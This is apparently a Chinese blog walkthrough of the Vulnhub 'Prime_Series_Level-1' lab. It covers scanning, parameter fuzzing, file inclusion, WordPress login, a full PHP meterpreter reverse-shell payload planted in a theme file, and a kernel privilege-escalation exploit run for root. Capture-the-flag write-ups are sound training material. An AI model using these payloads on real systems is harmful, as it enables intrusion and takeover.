---
layout: post
title: Prime_Series_Level-1
subtitle: Prime_Series_Level-1
date: 2022-12-07 14:37
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - Vulnhub
---
## Prime_Series_Level-1

#### IP扫描

使用nmap

```shell
nmap -sP 192.168.30.0/24
```

ip为192.168.30.134

```shell
nmap -A 192.168.30.134
```

![image-20221207143719379.png](https://kyonk.v6.army:1443/sHeuH3.png)

开放端口80和22

#### 目录扫描

```shell
dirb http://192.168.30.134
```

发现有wordpress（博客网站通用框架），访问http://192.168.30.134/wordpress

用户名：victor

继续限定文件类型扫描

```shell
dirb http://192.168.30.134 -X .txt,.php,.zip
```

![image-20221207144434177.png](https://kyonk.v6.army:1443/cGbGJ2.png)

发现3个文件，secret.txt最可疑，尝试访问

```shell
curl http://192.168.30.134/secret.txt

###回显
Ok I just want to do some help to you. 

Do some more fuzz on every page of php which was finded by you. And if
you get any right parameter then follow the below steps. If you still stuck 
Learn from here a basic tool with good usage for OSCP.

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
 


//see the location.txt and you will get your next move//

```

Tips：使用模糊测试查找正确参数，查看location.txt

使用 wfuzz 对 image.php 和 index.php 进行模糊测试

```shell
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.30.134/index.php?FUZZ
# 过滤结果 根据响应代码或字符数（不等于136）过滤掉结果
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136  http://192.168.30.134/index.php?FUZZ

wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --filter "c=200 and h!=136" http://192.168.30.134/index.php?FUZZ 
```

![image-20221207150628111.png](https://kyonk.v6.army:1443/zo7Fo6.png)

获得参数为file，猜测通过此参数可读取文件

```shell
curl http://192.168.30.134/index.php?file=/etc/passwd #失败
curl http://192.168.30.134/index.php?file=location.txt

###
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
</body>

Do something better <br><br><br><br><br><br>ok well Now you reah at the exact parameter <br><br>Now dig some more for next one <br>use 'secrettier360' parameter on some other php page for more fun.
</html>
```

Tips:使用 secrettier360 参数在其他页面上尝试

```shell
curl http://192.168.30.134/image.php?secrettier360=/etc/passwd
```

![image-20221207155810036.png](https://kyonk.v6.army:1443/PNZ6c8.png)

Tips:sacket:find password.txt file in my directory:/home/saket

```shell
curl http://192.168.30.134/image.php?secrettier360=/home/saket/password.txt
```

![image-20221207155950002.png](https://kyonk.v6.army:1443/HMLc0Y.png)

密码：follow_the_ippsec

获取用户名

```shell
cmseek -u http://192.168.30.134/wordpress #未找到
wpscan --url http://192.168.30.134/wordpress --enumerate u
```

![image-20221207160750307.png](https://kyonk.v6.army:1443/2YXdUs.png)

获取用户名：victor

[Log In ‹ Focus — WordPress](http://192.168.30.134/wordpress/wp-login.php)登录 victor,follow_the_ippsec。进入后台。

#### 反弹shell

查找漏洞，上传文件。

主题编辑器中发现`secret.php`是可以更新的

**创建shell代码**

使用msfvenom，创建反弹连接脚本

```shell
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.30.130 lport=7777 -o shell.php
# lhost 攻击者ip
# lport 攻击者端口
```

shell.php

```php
<?php /**/ error_reporting(0); $ip = '192.168.30.130'; $port = 7777; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

保存到secret.php并上传

**开启监听**

使用msfcosole，设置并开启监听，查找版本漏洞

```
msf6> use exploit/multi/handler
msf6> set payload php/meterpreter/reverse_tcp
msf6> set lhost 192.168.30.130
msf6> set lport 7777
# 开启监听
msf6> exploit
meterpreter> 
````

访问 http://192.168.0.108/wordpress/wp-content/themes/twentynineteen/secret.php（wordpress开源，通过分析源码获取路径）

之后监听终端显示`meterpreter>`可输入命令。

#### 提权

监听端口

````shell
meterpreter> getuid
meterpreter> sysinfo #获取系统信息
````

系统信息：

```
Computer    : ubuntu
OS          : Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64
Meterpreter : php/linux
```

获取内核漏洞

打开第二个终端，进入msfconsole

```shell
msf6> searchsploit 16.04 ubuntu
```

![image-20221207163638855.png](https://kyonk.v6.army:1443/hXBGQE.png)

使用`linux/local/45010.c`脚本，文件路径：`/usr/share/exploitdb/exploits/linux/local/45010.c`

```shell
# 拷贝
cp /usr/share/exploitdb/exploits/linux/local/45010.c /root
# 编译
gcc 45010.c -o 45010
```

终端1

```shell
meterpreter> upload /root/45010 /tmp/45010
meterpreter> shell #开启shell
cd /tmp
chmod +x 45010
./45010
whoami
# 回显root，提权成功
cd /root
ls
# enc
# enc.cpp
# enc.txt
# key.txt
# root.txt
# sql.py
# t.sh
# wfuzz
# wordpress.sql

cat root.txt
b2b17036da1de94cfb024540a8e7075a
```

**enc.cpp**

```cpp
#include<iostream>
#include<string>
#include<bits/stdc++.h>
using namespace std;
int main()
{
	string s;
	cout<<"enter password: ";
	cin>>s;
	if(s=="backup_password")
	{
		cout<<"good"<<endl;
		system("/bin/cp /root/enc.txt /home/saket/enc.txt");
		system("/bin/cp /root/key.txt /home/saket/key.txt");
	}
	return 0;
}
```

**enc.txt**

```
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
```

 **key.txt**

```
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
```

Tips:将“ippsec”字符串进行MD5加密：366A74CB3C959DE17D61DB30591C39D1。作为解密密钥

使用python

```python
from Crypto.Cipher import AES
from base64 import b64decode

data = b64decode(b"nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=")
key = b"366a74cb3c959de17d61db30591c39d1"
cip = AES.new(key,AES.MODE_ECB)
print(cip.decrypt(data).decode("utf-8"))
```

结果：Dont worry saket one day we will reach to our destination very soon. And if you forget your username then use your old password ==> "tribute_to_ippsec"

Victor,

获取saket用户密码：tribute_to_ippsec